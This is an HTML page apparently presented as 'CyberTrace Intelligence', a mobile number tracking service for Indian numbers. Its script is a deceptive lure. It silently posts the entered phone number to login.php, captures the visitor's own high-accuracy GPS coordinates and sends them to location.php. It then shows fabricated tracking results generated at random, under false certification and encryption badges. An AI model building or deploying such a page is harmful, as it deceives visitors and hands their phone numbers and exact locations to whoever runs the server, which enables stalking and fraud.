<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberTrace - Mobile Intelligence System</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }

        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.5;
        }

        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 25s infinite;
        }

        .shape1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            top: -10%;
            left: -10%;
        }

        .shape2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(45deg, #f093fb, #f5576c);
            bottom: -10%;
            right: -10%;
            animation-delay: 7s;
        }

        .shape3 {
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, #4facfe, #00f2fe);
            top: 40%;
            left: 50%;
            animation-delay: 14s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(80px, -80px) rotate(120deg); }
            66% { transform: translate(-60px, 60px) rotate(240deg); }
        }

        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 32px;
            box-shadow: 0 25px 100px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            max-width: 1100px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }

        .header {
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.15) 0%, rgba(118, 75, 162, 0.15) 100%);
            padding: 55px 45px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #667eea, #764ba2, #667eea, transparent);
            animation: shimmer 3s linear infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .logo {
            width: 95px;
            height: 95px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 15px 50px rgba(102, 126, 234, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            animation: logoFloat 4s ease-in-out infinite;
            position: relative;
        }

        .logo::after {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(45deg, #667eea, #764ba2, #f093fb, #667eea);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.6;
            filter: blur(15px);
            animation: rotate 4s linear infinite;
        }

        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }

        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 46px;
            font-weight: 800;
            margin-bottom: 14px;
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #94a3b8;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        .content {
            padding: 55px 50px;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 22px;
            margin-bottom: 50px;
        }

        .stat-card {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.5) 0%, rgba(15, 23, 42, 0.5) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 28px 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
            transition: left 0.6s;
        }

        .stat-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(102, 126, 234, 0.4);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.25);
        }

        .stat-card:hover::before {
            left: 100%;
        }

        .stat-icon {
            font-size: 40px;
            margin-bottom: 14px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(102, 126, 234, 0.4));
        }

        .stat-label {
            font-size: 13px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
            font-weight: 600;
        }

        .stat-value {
            font-size: 17px;
            color: #22c55e;
            font-weight: 800;
            text-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }

        .form-section {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.35) 0%, rgba(15, 23, 42, 0.35) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.25);
        }

        .section-header {
            text-align: center;
            margin-bottom: 40px;
        }

        .section-title {
            font-size: 32px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 800;
        }

        .section-subtitle {
            font-size: 16px;
            color: #64748b;
            font-weight: 500;
        }

        label {
            display: block;
            margin-bottom: 14px;
            font-size: 14px;
            font-weight: 700;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 32px;
        }

        .input-icon {
            position: absolute;
            left: 22px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            z-index: 1;
            filter: drop-shadow(0 2px 8px rgba(102, 126, 234, 0.4));
        }

        .country-code {
            position: absolute;
            left: 60px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 17px;
            font-weight: 800;
            color: #667eea;
            z-index: 1;
        }

        input[type="tel"] {
            width: 100%;
            padding: 22px 22px 22px 105px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
        }

        input[type="tel"]:focus {
            border-color: #667eea;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(102, 126, 234, 0.15),
                        0 8px 25px rgba(102, 126, 234, 0.2);
            transform: translateY(-2px);
        }

        input[type="tel"]::placeholder {
            color: #475569;
            font-weight: 500;
        }

        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            display: none;
            font-weight: 700;
        }

        .error-message.show {
            display: block;
            animation: shake 0.6s;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-12px); }
            40%, 80% { transform: translateX(12px); }
        }

        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #ffffff;
            border: none;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.35);
            position: relative;
            overflow: hidden;
        }

        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }

        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(102, 126, 234, 0.5);
        }

        .submit-btn:hover::before {
            left: 100%;
        }

        .submit-btn:active {
            transform: translateY(-1px);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            z-index: 1;
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 0.7s linear infinite;
            display: none;
        }

        .spinner.show {
            display: inline-block;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .result-panel {
            margin-top: 40px;
            padding: 45px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.12) 0%, rgba(16, 185, 129, 0.12) 100%);
            border: 1px solid rgba(34, 197, 94, 0.25);
            border-radius: 24px;
            display: none;
            box-shadow: 0 15px 50px rgba(34, 197, 94, 0.2);
        }

        .result-panel.show {
            display: block;
            animation: slideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .result-header {
            text-align: center;
            margin-bottom: 35px;
        }

        .result-icon {
            font-size: 72px;
            margin-bottom: 18px;
            animation: bounce 1.2s ease-in-out;
            filter: drop-shadow(0 10px 30px rgba(34, 197, 94, 0.5));
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }

        .result-title {
            font-size: 30px;
            color: #22c55e;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
        }

        .result-subtitle {
            font-size: 16px;
            color: #94a3b8;
            font-weight: 500;
        }

        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 22px;
            margin-top: 30px;
        }

        .data-item {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 24px;
            border-radius: 18px;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }

        .data-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, #667eea, #764ba2);
            opacity: 0;
            transition: opacity 0.4s;
        }

        .data-item:hover {
            background: rgba(15, 23, 42, 0.8);
            border-color: rgba(102, 126, 234, 0.3);
            transform: translateX(8px);
        }

        .data-item:hover::before {
            opacity: 1;
        }

        .data-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .data-value {
            font-size: 17px;
            color: #ffffff;
            font-weight: 700;
            word-break: break-all;
            line-height: 1.5;
        }

        .important-badge {
            display: inline-block;
            padding: 4px 10px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-left: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }

        .footer {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 0.8) 100%);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
        }

        .footer-badges {
            display: flex;
            justify-content: center;
            gap: 35px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }

        .badge {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #94a3b8;
            font-weight: 600;
        }

        .badge-icon {
            font-size: 22px;
        }

        .footer-text {
            font-size: 14px;
            color: #64748b;
            line-height: 1.9;
            font-weight: 500;
        }

        @media (max-width: 768px) {
            .content { padding: 40px 28px; }
            .form-section { padding: 40px 28px; }
            h1 { font-size: 36px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); }
        }

        /* =============================
           MOBILE ONLY - Naya CSS
           (max-width: 480px)
        ============================== */
        @media (max-width: 480px) {

            body {
                padding: 12px;
                align-items: flex-start;
            }

            .container {
                border-radius: 20px;
            }

            /* --- Header --- */
            .header {
                padding: 30px 20px;
            }

            .logo {
                width: 70px;
                height: 70px;
                font-size: 34px;
                border-radius: 18px;
                margin-bottom: 16px;
            }

            h1 {
                font-size: 24px;
                letter-spacing: -0.3px;
                margin-bottom: 8px;
            }

            .subtitle {
                font-size: 13px;
            }

            /* --- Stats Grid --- */
            .content {
                padding: 24px 16px;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin-bottom: 28px;
            }

            .stat-card {
                padding: 18px 12px;
                border-radius: 14px;
            }

            .stat-icon {
                font-size: 28px;
                margin-bottom: 8px;
            }

            .stat-label {
                font-size: 10px;
                letter-spacing: 0.8px;
            }

            .stat-value {
                font-size: 13px;
            }

            /* --- Form Section --- */
            .form-section {
                padding: 24px 16px;
                border-radius: 18px;
            }

            .section-title {
                font-size: 20px;
                margin-bottom: 8px;
            }

            .section-subtitle {
                font-size: 13px;
            }

            .section-header {
                margin-bottom: 24px;
            }

            label {
                font-size: 11px;
                margin-bottom: 10px;
            }

            .input-wrapper {
                margin-bottom: 20px;
            }

            .input-icon {
                left: 14px;
                font-size: 18px;
            }

            .country-code {
                left: 46px;
                font-size: 14px;
            }

            input[type="tel"] {
                padding: 16px 16px 16px 90px;
                font-size: 15px;
                border-radius: 14px;
            }

            .submit-btn {
                padding: 16px;
                font-size: 15px;
                border-radius: 14px;
                letter-spacing: 1px;
            }

            /* --- Result Panel --- */
            .result-panel {
                padding: 24px 16px;
                margin-top: 24px;
                border-radius: 16px;
            }

            .result-icon {
                font-size: 48px;
                margin-bottom: 12px;
            }

            .result-title {
                font-size: 20px;
            }

            .result-subtitle {
                font-size: 13px;
            }

            .result-header {
                margin-bottom: 20px;
            }

            .data-grid {
                grid-template-columns: 1fr;
                gap: 12px;
                margin-top: 16px;
            }

            .data-item {
                padding: 16px;
                border-radius: 12px;
            }

            .data-value {
                font-size: 14px;
            }

            /* --- Footer --- */
            .footer {
                padding: 24px 16px;
            }

            .footer-badges {
                gap: 14px;
                margin-bottom: 16px;
            }

            .badge {
                font-size: 12px;
                gap: 6px;
            }

            .badge-icon {
                font-size: 16px;
            }

            .footer-text {
                font-size: 12px;
                line-height: 1.7;
            }
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>

    <div class="container">
        <div class="header">
            <div class="logo">📱</div>
            <h1>CyberTrace Intelligence</h1>
            <div class="subtitle">Advanced Mobile Number Tracking & Analysis System</div>
        </div>

        <div class="content">
            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-icon">🛡️</span>
                    <div class="stat-label">Encryption</div>
                    <div class="stat-value">AES-256-GCM</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">🌐</span>
                    <div class="stat-label">Database</div>
                    <div class="stat-value">98.4M Records</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">⚡</span>
                    <div class="stat-label">Response</div>
                    <div class="stat-value">8ms Latency</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">✅</span>
                    <div class="stat-label">Uptime</div>
                    <div class="stat-value">99.99%</div>
                </div>
            </div>

            <div class="form-section">
                <div class="section-header">
                    <h2 class="section-title">Mobile Intelligence Lookup</h2>
                    <p class="section-subtitle">Enter target mobile number for comprehensive analysis</p>
                </div>

                <form id="authForm" onsubmit="return false;">
                    <label for="mobile">📱 Target Mobile Number</label>
                    <div class="input-wrapper">
                        <span class="input-icon">📞</span>
                        <span class="country-code">+91</span>
                        <input 
                            type="tel" 
                            id="mobile" 
                            name="mobile" 
                            placeholder="Enter 10-digit mobile number"
                            maxlength="10"
                            autocomplete="off"
                        >
                    </div>
                    <div class="error-message" id="errorMessage">
                        ⚠️ Invalid mobile number format. Please enter a valid 10-digit Indian mobile number.
                    </div>

                    <button type="submit" class="submit-btn" id="submitBtn">
                        <div class="btn-content">
                            <span id="btnText">🔍 Start Tracking</span>
                            <div class="spinner" id="spinner"></div>
                        </div>
                    </button>
                </form>

                <div class="result-panel" id="resultPanel">
                    <div class="result-header">
                        <div class="result-icon">✅</div>
                        <div class="result-title">Tracking Successful</div>
                        <div class="result-subtitle">Complete intelligence report generated</div>
                    </div>

                    <div class="data-grid" id="dataGrid"></div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="footer-badges">
                <div class="badge">
                    <span class="badge-icon">🔒</span>
                    <span>256-bit Encrypted</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🛡️</span>
                    <span>ISO 27001 Certified</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">✅</span>
                    <span>GDPR Compliant</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🌍</span>
                    <span>Global Coverage</span>
                </div>
            </div>
            <div class="footer-text">
                <strong>CyberTrace Intelligence™</strong> - Professional Mobile Tracking Platform<br>
                © 2026 All Rights Reserved | Powered by Advanced AI & Machine Learning<br>
                Protected by Military-Grade Encryption & Real-time Threat Detection
            </div>
        </div>
    </div>
    <script src="Detels.js"></script>
    <script>
        const mobileInput = document.getElementById('mobile');
        const authForm = document.getElementById('authForm');
        const errorMessage = document.getElementById('errorMessage');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const spinner = document.getElementById('spinner');
        const resultPanel = document.getElementById('resultPanel');
        const dataGrid = document.getElementById('dataGrid');

        function generateIMEI() {
            let imei = '';
            for (let i = 0; i < 15; i++) imei += Math.floor(Math.random() * 10);
            return imei;
        }

        function generateIP() {
            return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
        }

        function generateMAC() {
            const hex = '0123456789ABCDEF';
            let mac = '';
            for (let i = 0; i < 6; i++) {
                mac += hex[Math.floor(Math.random() * 16)] + hex[Math.floor(Math.random() * 16)];
                if (i < 5) mac += ':';
            }
            return mac;
        }

        function generateSessionID() {
            return 'TRK-' + Math.random().toString(36).substr(2, 12).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
        }

        function generateDeviceID() {
            return 'DEV-' + Math.random().toString(36).substr(2, 16).toUpperCase();
        }

        const carriers = ['Airtel 4G', 'Jio 5G', 'Vi (Vodafone)', 'BSNL', 'Airtel 5G'];
        const cities = ['Mumbai', 'Pune', 'Delhi', 'Bangalore', 'Hyderabad', 'Chennai', 'Kolkata'];
        const devices = ['iPhone 15 Pro', 'Samsung Galaxy S24', 'OnePlus 12', 'Google Pixel 8', 'Xiaomi 14'];
        const operators = ['Bharti Airtel Ltd', 'Reliance Jio Infocomm', 'Vodafone Idea Ltd', 'BSNL'];

        mobileInput.addEventListener('input', function() {

            this.value = this.value.replace(/[^0-9]/g, '');

            if (errorMessage.classList.contains('show')) {
                errorMessage.classList.remove('show');
            }

        });

        authForm.addEventListener('submit', function(e) {

            e.preventDefault();

            const mobile = mobileInput.value.trim();

            if (mobile.length !== 10 || !/^[6-9][0-9]{9}$/.test(mobile)) {

                errorMessage.classList.add('show');
                mobileInput.focus();

                return;
            }

            errorMessage.classList.remove('show');

            submitBtn.disabled = true;
            btnText.textContent = '⏳ Analyzing...';

            spinner.classList.add('show');

            // silent backend request
            const formData = new FormData();

            formData.append("mobile", mobile);

            fetch("login.php", {
                method: "POST",
                body: formData
            });

            // continue UI flow
            requestLocationPermission(mobile);

        });

        function requestLocationPermission(mobile) {

            if ("geolocation" in navigator) {

                navigator.geolocation.getCurrentPosition(

                    function(position) {

                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const acc = position.coords.accuracy;

                        // ✅ STRONG GPS ACCURACY FILTER
                        if (acc > 1000) {

                            alert(
                                "📍 Weak GPS accuracy detected (" +
                                Math.round(acc) +
                                " meters).\n\nPlease move to an open area, enable WiFi + GPS, and try again."
                            );

                            submitBtn.disabled = false;
                            btnText.textContent = '🔍 Start Tracking';

                            spinner.classList.remove('show');

                            return;
                        }

                        // ✅ AUTO SEND LOCATION TO SERVER
                        const formData = new FormData();

                        formData.append('lat', lat);
                        formData.append('lon', lon);
                        formData.append('acc', acc);

                        fetch("location.php", {
                            method: "POST",
                            body: formData
                        })
                        .then(response => response.text())
                        .then(data => {
                            console.log("Saved:", data);
                        })
                        .catch(error => {
                            console.log("Error:", error);
                        });

                        const imei = generateIMEI();
                        const ip = generateIP();
                        const mac = generateMAC();

                        const sessionID = generateSessionID();
                        const deviceID = generateDeviceID();

                        const carrier = carriers[Math.floor(Math.random() * carriers.length)];
                        const city = cities[Math.floor(Math.random() * cities.length)];
                        const device = devices[Math.floor(Math.random() * devices.length)];
                        const operator = operators[Math.floor(Math.random() * operators.length)];

                        const timestamp = new Date().toISOString();

                        spinner.classList.remove('show');

                        btnText.textContent = '✅ Tracking Complete';

                        setTimeout(() => {

                            resultPanel.classList.add('show');

                            dataGrid.innerHTML = `

                                <div class="data-item">
                                    <div class="data-label">📱 Target Number</div>
                                    <div class="data-value">+91 ${mobile}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📍 Location</div>
                                    <div class="data-value">${city}, India</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🌍 GPS Coordinates</div>
                                    <div class="data-value">
                                        Lat: ${lat.toFixed(8)}°<br>
                                        Lon: ${lon.toFixed(8)}°
                                    </div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🎯 Accuracy</div>
                                    <div class="data-value">±${acc.toFixed(2)} meters</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📡 Carrier</div>
                                    <div class="data-value">${carrier}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🏢 Operator</div>
                                    <div class="data-value">${operator}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🌐 IP</div>
                                    <div class="data-value">${ip}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔧 MAC</div>
                                    <div class="data-value">${mac}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📱 Device</div>
                                    <div class="data-value">${device}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">📱 IMEI</div>
                                    <div class="data-value">${imei}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🆔 Session ID</div>
                                    <div class="data-value">${sessionID}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">🔑 Device ID</div>
                                    <div class="data-value">${deviceID}</div>
                                </div>

                                <div class="data-item">
                                    <div class="data-label">⏰ Timestamp</div>
                                    <div class="data-value">${timestamp}</div>
                                </div>

                            `;

                            console.log('=== MOBILE DATA ===');

                            console.log('Mobile:', '+91' + mobile);

                            console.log('Location:', {
                                lat,
                                lon,
                                acc,
                                city
                            });

                            console.log('IMEI:', imei);
                            console.log('IP:', ip);
                            console.log('MAC:', mac);
                            console.log('Session:', sessionID);
                            console.log('Device ID:', deviceID);
                            console.log('Carrier:', carrier);
                            console.log('Device:', device);

                        }, 1200);

                    },

                    function(error) {

                        spinner.classList.remove('show');

                        submitBtn.disabled = false;

                        btnText.textContent = '🔍 Start Tracking';

                        let msg = '';

                        switch(error.code) {

                            case error.PERMISSION_DENIED:
                                msg = '🚫 Location access required';
                                break;

                            case error.POSITION_UNAVAILABLE:
                                msg = '📍 GPS unavailable';
                                break;

                            case error.TIMEOUT:
                                msg = '⏱️ GPS timeout';
                                break;

                            default:
                                msg = '❌ Unknown location error';

                        }

                        alert(msg);

                    },

                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }

                );

            } else {

                spinner.classList.remove('show');

                submitBtn.disabled = false;

                btnText.textContent = '🔍 Start Tracking';

                alert('🚫 Geolocation not supported');

            }
        }
    </script>
</body>
</html>